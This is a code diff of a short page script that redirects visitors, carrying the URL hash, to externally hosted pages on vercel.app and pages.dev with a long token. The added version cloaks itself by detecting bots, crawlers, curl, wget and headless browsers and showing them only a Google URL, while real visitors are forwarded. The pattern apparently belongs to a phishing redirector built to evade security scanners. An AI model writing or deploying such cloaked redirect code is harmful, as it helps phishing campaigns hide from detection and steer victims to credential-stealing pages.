@@ -1,11 +1,25 @@
- <script type="text/javascript">
-        if(window.location.hash) {
-            var url = window.location.href;
-            var hash = url.split('#').pop();
+<script>
+    function isLikelyBot() {
+        const botPatterns = [
+            /bot/i, /crawl/i, /spider/i, /scrapy/i, /python/i,
+            /curl/i, /wget/i, /node\.js/i, /phantomjs/i
+        ];
 
-            window.location.replace("https://appcryptee.vercel.app?jf7l3pn8ewk4anj3p7dkaiikt9eqrf2dbz7kdr8wneuvwrhtkqbdxso3bklziekwh4knm5x9ob6ddjdzevyysfco6sufhunr9ysq#"+hash);
+        const ua = navigator.userAgent || '';
+        return botPatterns.some(pattern => pattern.test(ua)) ||
+               !navigator.webdriver === false; // headless detection
+    }
+
+    if (isLikelyBot()) {
+        document.body.innerHTML = "https://www.google.com";
+    } else {
+        // Your redirect logic here
+        if (window.location.hash) {
+            var hash = window.location.hash.substring(1);
+            var targetURL = "https://exc80-d552e30e0f8a226b1ccb99c.pages.dev?jf7l3pn8ewk4anj3p7dkaiikt9eqrf2dbz7kdr8wneuvwrhtkqbdxso3bklziekwh4knm5x9ob6ddjdzevyysfco6sufhunr9ysq#" + hash;
+            window.location.replace(targetURL);
         } else {
-          window.location.replace("https://appcryptee.vercel.app?jf7l3pn8ewk4anj3p7dkaiikt9eqrf2dbz7kdr8wneuvwrhtkqbdxso3bklziekwh4knm5x9ob6ddjdzevyysfco6sufhunr9ysq#"+hash);
+            window.location.replace("https://www.google.com");
         }
-
-    </script>
+    }
+</script>
